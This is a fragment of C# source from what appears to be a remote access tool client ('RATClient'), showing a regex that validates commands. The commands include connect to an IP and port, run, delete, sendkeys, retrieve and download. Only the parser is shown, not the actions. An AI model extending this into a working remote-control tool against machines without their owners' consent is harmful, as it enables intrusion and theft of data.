...
namespace RATClient
{
    public class Program
    {
        ...
        {
            Match m = Regex.Match(CMD, "^disconnect$|^info$|^processes$|^shutdown$|^clipboard$|^services$|^software$|^clear$|^help$|^exit$|^connect (?:(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\\.){3}(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9]):([1-9][0-9]{0,3}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$|^message .+$|^run .+$|^delete .+$|^sendkeys .+$|^retrieve .+$|^search .+$|^download .+ .+$", RegexOptions.IgnoreCase);
            return m.Success;
        }
